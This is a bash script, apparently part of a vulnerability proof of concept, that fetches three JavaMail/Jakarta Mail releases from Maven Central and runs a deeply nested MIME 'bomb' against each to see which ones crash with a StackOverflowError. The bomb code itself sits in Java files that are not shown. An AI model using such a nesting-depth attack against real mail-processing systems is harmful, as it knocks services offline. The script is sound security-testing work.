#!/usr/bin/env bash
# Version matrix: run the SAME nested-MIME bomb against three JavaMail/Jakarta Mail
# releases and show which DoS primitive each exhibits. Deterministic: parsing runs
# on a fixed-size (1 MB) thread stack, so the StackOverflowError lands at a stable
# depth regardless of host JVM defaults. No external hosts contacted except Maven Central.
set -euo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
WORK="$(mktemp -d)"; cd "$WORK"
NEST="${1:-6000}"; STACK="${2:-1048576}"   # nesting depth ; thread stack bytes (1 MB)
B="https://repo1.maven.org/maven2"

echo "[*] downloading releases from Maven Central"
curl -fsSL -o m144.jar  "$B/javax/mail/mail/1.4.4/mail-1.4.4.jar"
curl -fsSL -o m162.jar  "$B/com/sun/mail/javax.mail/1.6.2/javax.mail-1.6.2.jar"
curl -fsSL -o act.jar   "$B/javax/activation/activation/1.1.1/activation-1.1.1.jar"
mkdir -p ang
curl -fsSL -o ang/angus-mail.jar       "$B/org/eclipse/angus/angus-mail/2.0.3/angus-mail-2.0.3.jar"
curl -fsSL -o ang/jakarta.mail-api.jar "$B/jakarta/mail/jakarta.mail-api/2.1.3/jakarta.mail-api-2.1.3.jar"
curl -fsSL -o ang/angus-activation.jar "$B/org/eclipse/angus/angus-activation/2.0.2/angus-activation-2.0.2.jar"
curl -fsSL -o ang/jakarta.activation-api.jar "$B/jakarta/activation/jakarta.activation-api/2.1.3/jakarta.activation-api-2.1.3.jar"
ANG_CP="ang/angus-mail.jar:ang/jakarta.mail-api.jar:ang/angus-activation.jar:ang/jakarta.activation-api.jar"

echo "[*] compiling"
javac -cp "m144.jar:act.jar" -d jx "$HERE/src/MatrixDos_javax.java"
javac -cp "$ANG_CP"          -d jk "$HERE/src/MatrixDos_jakarta.java"

echo; printf "RELEASE\tOUTCOME\n"; echo "----------------------------------------------------------------"
java -cp "jx:m144.jar:act.jar"  MatrixDos_javax    "javax.mail:mail 1.4.4 (2011, EOL)"      "$NEST" "$STACK"
java -cp "jx:m162.jar:act.jar"  MatrixDos_javax    "com.sun.mail:javax.mail 1.6.2 (2018)"   "$NEST" "$STACK"
java -cp "jk:$ANG_CP"           MatrixDos_jakarta  "org.eclipse.angus:angus-mail 2.0.3 (current)" "$NEST" "$STACK"
echo "----------------------------------------------------------------"
echo "[i] StackOverflowError on any row = still vulnerable to nesting-depth DoS."
